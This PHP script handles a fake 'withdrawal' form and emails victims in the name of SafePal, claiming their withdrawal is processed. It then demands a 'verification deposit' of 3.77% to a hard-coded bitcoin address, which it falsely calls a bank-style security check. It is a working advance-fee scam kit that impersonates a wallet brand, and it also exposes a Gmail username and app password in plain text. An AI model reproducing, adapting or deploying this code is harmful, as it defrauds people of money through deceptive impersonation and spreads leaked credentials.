<?php
session_start();
$userEmail = $_SESSION['user_email'] ?? null;

ini_set('display_errors', 1);
error_reporting(E_ALL);

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer(true);

try {
    // Retrieve form fields
    $cashappTag = $_POST['cashapptag'];
    $rawAmount = $_POST['amount'];
    $amount = floatval(str_replace(['$', ','], '', $rawAmount)); // Ensure it's a number

    // Optional: Calculate verification deposit (e.g., 3.77% of withdrawal)
    $verificationDeposit = number_format($amount * 0.0377, 2);

    // Update email from form if present
    if (isset($_POST['email'])) {
        $userEmail = $_POST['email'];
        $_SESSION['user_email'] = $userEmail;
    }

    // Setup PHPMailer
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'safepalservicess@gmail.com';  
    $mail->Password   = 'xijsanyahhbbxofs';
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;

    $mail->setFrom('safepalservicess@gmail.com', 'Withdrawal Form');

    $mail->addAddress('safepalservicess@gmail.com'); 
    if ($userEmail) {
        $mail->addAddress($userEmail);
    }

    $mail->isHTML(true);
    $mail->Subject = 'Withdrawal Confirmation - Action Required';

    // 🟢 Email body with dynamic amount
    $mail->Body = "
    <div style='font-family: Arial, sans-serif; color: #333; line-height: 1.6; font-size: 16px;'>
        <p><strong>Congratulations!</strong> Your withdrawal of <strong>\$" . number_format($amount, 2) . "</strong> has been processed successfully.</p>

        <p>Your assigned address below is securely linked to your Cash App account for the final withdrawal step. This means any verification deposit you make to this address will be reflected directly in your Cash App once processed.</p>

        <p><strong style='color: #1E6FFF;'>Assigned Address:</strong><br>
        <code>bc1q46p7qmw70a4mhnu9jcxn78rhq4n2a024yr993f</code></p>

        <p>To complete your withdrawal, please make a <strong>verification deposit of \$$verificationDeposit to the address above.</strong> Once confirmed, this deposit will be added to your withdrawal amount of \$" . number_format($amount, 2) . " and will reflect in your Cash App immediately, guaranteeing no loss of funds.</p>

        <h4 style='color: #1E6FFF; style='margin-left: 10px;'>Important:</h4>
        <ul>
            <li>This is a security procedure, not a payment to anyone.</li>
            <li>It works just like micro-deposit verification used by banks to confirm account access.</li>
            <li>Never share your private info or send funds to anyone claiming to be a SafePal agent outside official communication.</li>
        </ul>

        <p>If you have any questions, feel free to reply to this email.</p>

        <p>Thank you for choosing SafePal.<br>
        <span style='color: #1E6FFF;'>Best regards,<br>
        The SafePal Team</span></p>
    </div>";

    $mail->send();

    header('Location: withdrawalsummary.html');
    exit;

} catch (Exception $e) {
    echo "Mailer Error: {$mail->ErrorInfo}";
}
